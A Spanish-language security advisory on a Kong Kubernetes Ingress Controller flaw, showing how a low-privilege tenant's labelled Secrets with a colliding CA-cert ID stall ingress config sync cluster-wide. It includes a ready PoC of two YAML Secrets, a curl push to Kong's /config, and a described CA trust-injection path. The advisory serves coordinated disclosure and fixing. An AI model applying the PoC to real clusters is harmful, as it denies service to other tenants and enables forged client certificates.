# CVE-2026-15228: DoS de config-sync cluster-wide en Kong Kubernetes Ingress Controller vía un Secret namespaceado con label

**Publicado:** 2026-07-29 **Reportado:** 2026-06-07 **Severidad:** 8.5 Alta **Estado:** Corregido en Kong Kubernetes Ingress Controller 3.4.18 y 3.5.11 (GHSA-g9h6-h2xj-mf78) **CWEs:** CWE-862 (Missing Authorization) + CWE-400 (Uncontrolled Resource Consumption) + CWE-295 (Improper Certificate Validation)

---

Kong Kubernetes Ingress Controller (KIC) recolecta CA certificates desde Secrets y ConfigMaps por un label solamente, sin restricción de namespace ni de ingress-class, y usa un campo controlado por el atacante del Secret como la primary key del CA-certificate de Kong. Un usuario que solo puede crear Secrets en su propio namespace puede escribir en el pool cluster-global de CA-certificates de Kong. Colisionando la primary key entre dos de sus propios Secrets, hace que Kong rechace el declarative config entero de KIC, lo que stallea la propagación del config de ingress para todos los tenants del cluster hasta que un operator encuentre y borre el Secret ofensivo.

---

## El bug

`internal/store/store.go` `ListCACerts` lista cada Secret y ConfigMap de CA-cert en el cluster, gated solo por el label `konghq.com/ca-cert=true`:

```go
// ListCACerts returns all Secrets and ConfigMaps containing the label "konghq.com/ca-cert"="true".
func (s Store) ListCACerts() ([]*corev1.Secret, []*corev1.ConfigMap, error) {
    req, err := labels.NewRequirement(caCertKey, selection.Equals, []string{"true"})
    ...
    err = cache.ListAll(s.stores.Secret, labels.NewSelector().Add(*req), func(ob any) {
        if p, ok := ob.(*corev1.Secret); ok { secrets = append(secrets, p) }
    })
    ...
}
```

No hay ningún filtro `isValidIngressClass` acá (contrastá con `ListKongVaults` y la mayoría de los otros métodos `List*` en el mismo archivo, que sí filtran por ingress class), y no hay scoping de namespace. Cualquier Secret en cualquier namespace con el label es recogido cluster-wide.

El translator entonces toma el ID del CA-certificate de Kong directo del `data["id"]` del Secret:

```go
// internal/dataplane/translator/translate_cacerts.go
secretID, ok := caCertData.data["id"]      // controlado por el atacante
...
caCert, err := toKongCACertificate([]byte(caCertStr), caCertData.obj, secretID)
...
return kong.CACertificate{ ID: secretID, Cert: string(caCertBytes), ... }
```

`deckgen/generate.go` no hace de-duplicación ni detección de conflictos sobre CA-cert IDs. Dos Secrets de CA-cert con el mismo `data["id"]` producen entonces dos entries de `ca_certificates` con la misma primary key en el declarative config que KIC pushea a Kong.

Dos decisiones aisladas son defendibles: los labels son un selector Kubernetes normal; tomar un ID del data del Secret evita colisiones cuando el operator quiere uno específico. Juntas, sin filtro de ingress class, sin scoping de namespace, y sin detector de conflictos de ID, se vuelven una primitiva cluster-wide desde un único Secret.

Donde vive el bug:

- `internal/store/store.go` (`ListCACerts`, solo label, cluster-wide, sin filtro de class ni namespace)
- `internal/dataplane/translator/translate_cacerts.go` (ID del CA-cert de Kong = `data["id"]` del atacante)
- `internal/dataplane/deckgen/generate.go` (sin detección de conflicto de ID de CA-cert)

## PoC

Un atacante con `create secret` en su propio namespace aplica dos Secrets:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: x1
  namespace: attacker
  labels:
    konghq.com/ca-cert: "true"
data:
  id: "MTExMTExMTEtMTExMS0xMTExLTExMTEtMTExMTExMTExMTEx"
  cert: "<attacker CA b64>"
---
apiVersion: v1
kind: Secret
metadata:
  name: x2
  namespace: attacker
  labels:
    konghq.com/ca-cert: "true"
data:
  id: "MTExMTExMTEtMTExMS0xMTExLTExMTEtMTExMTExMTExMTEx"
  cert: "<another CA b64>"
```

KIC ingesta ambos cluster-wide y emite un declarative config con dos `ca_certificates` compartiendo un ID. Pushear ese config a Kong (DB-less `/config`, el modo que KIC usa) es rechazado, y Kong rechaza el documento entero, no solo el entity ofensivo:

```
$ curl -s -X POST :8001/config -F config=@dup.json -w '[HTTP %{http_code}]'
{"fields":{"ca_certificates":[null,"uniqueness violation: 'ca_certificates' entity with primary key set to '1111...1111' already declared"]},"code":14,"name":"invalid declarative configuration"}
[HTTP 400]
```

Como KIC pushea su configuración atómicamente, este rechazo significa que ningún cambio de routes, services, plugins o consumers del cluster se aplica hasta que el Secret ofensivo sea borrado. Un solo tenant namespaceado tranca la propagación del config de ingress para el cluster entero. El atacante controla ambos Secrets, así que la colisión de primary key está garantizada sin necesidad de saber los IDs de otros tenants.

Pasos de reproducción:

1. Como usuario con `create secret` en cualquier namespace, creá dos Secrets con label `konghq.com/ca-cert: "true"` con el mismo `data.id` y CA certs válidos.
2. KIC construye un declarative config con un id de `ca_certificates` duplicado y lo pushea.
3. Kong devuelve 400 y el push del config entero falla; el config de ingress cluster-wide queda congelado.

## Impacto

Un tenant que solo puede crear Secrets en su propio namespace alcanza al cluster entero. KIC ingesta su Secret de CA-cert sin importar namespace ni ingress class, y una colisión de primary key que controla totalmente hace que Kong rechace el documento de config entero de KIC. El resultado es un outage cluster-wide de config-sync de ingress: los cambios de route, service, plugin y consumer de cada otro tenant dejan de aplicarse, triggereado por un solo Secret de bajo privilegio y persistiendo hasta que un operator manualmente lo encuentre y lo borre.

Impacto secundario (trust injection): con un ID único en vez de uno colisionante, el CA certificate del atacante es aceptado y agregado al pool cluster-global de CAs de Kong. Cualquier plugin (por ejemplo `mtls-auth`) que referencie ese ID de CA-cert entonces confiaría en la CA del atacante, habilitando forge de client certificates contra esa route.

**CVSS 3.1:** 8.5 Alta, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H`. El base credita el DoS de config-sync cluster-wide probado (`A:H`) más el tampering de integridad de config (`I:L`). El path de trust-injection es condicional a que un plugin víctima referencie el ID de CA-cert inyectado y no se acredita en el base.

## Fix

Scopear y kear el pool de CA-cert de forma segura:

- En `ListCACerts`, aplicar el mismo filtrado por ingress-class que usan los otros métodos `List*`, y considerar restringir qué namespaces pueden contribuir CA certs cluster-global (o requerir un recurso cluster-scoped para material de trust cluster-global).
- Derivar el ID del CA-certificate de Kong desde la identidad server-assigned del Secret (`secret.UID` / namespaced name), exactamente como los TLS certificates son kaed en `translate_certs.go`, en vez de confiar en `data["id"]`.
- En `deckgen`, detectar conflictos de ID de CA-cert y dropear/skipear el entity ofensivo con un translation failure sobre ese objeto, en vez de emitir un duplicado que hace fallar el push entero. KIC ya tiene un detector de conflictos de credentials del cual modelarlo.

Corregido en Kong Kubernetes Ingress Controller 3.4.18 y 3.5.11.

## Divulgación

Reportado privadamente a Kong vía el private vulnerability reporting de GitHub el 2026-06-07 contra `master` HEAD `e0d7b00`. CVE-2026-15228 asignado, GHSA-g9h6-h2xj-mf78 publicado el 2026-07-29.

Gracias al equipo de Kong por el triage y la coordinación.

## Links

- Advisory: https://github.com/Kong/kubernetes-ingress-controller/security/advisories/GHSA-g9h6-h2xj-mf78
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-15228
- Kong Kubernetes Ingress Controller: https://github.com/Kong/kubernetes-ingress-controller
- Docs de Kong DB-less declarative config: https://docs.konghq.com/gateway/latest/production/deployment-topologies/db-less-and-declarative-config/
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
- CWE-295: https://cwe.mitre.org/data/definitions/295.html
